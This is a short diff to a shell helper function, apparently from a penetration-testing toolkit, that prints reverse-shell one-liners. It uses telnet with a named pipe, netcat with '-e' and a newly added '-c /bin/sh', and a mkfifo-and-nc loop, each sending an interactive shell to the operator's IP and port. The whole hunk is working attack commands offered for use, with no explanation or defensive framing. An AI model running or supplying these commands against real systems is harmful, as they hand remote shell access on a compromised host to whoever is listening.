@@ -502,8 +502,9 @@ function mtshell {
     echo "mknod a p; telnet $(getip a) $1 0<a | /bin/sh 1>a"
 
     echo
-    echo ">>>> Netcat <<<<"
-    echo "nc -e /bin/sh $(getip a) $1    # also try '-e bash' '-e sh'"      
+    echo ">>>> Netcat <<<< ... also try 'sh' 'bash' '/bin/bash'"
+    echo "nc -c /bin/sh $(getip a) $1"      
+    echo "nc -e /bin/sh $(getip a) $1"      
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(getip a) $1 >/tmp/f"
 
 
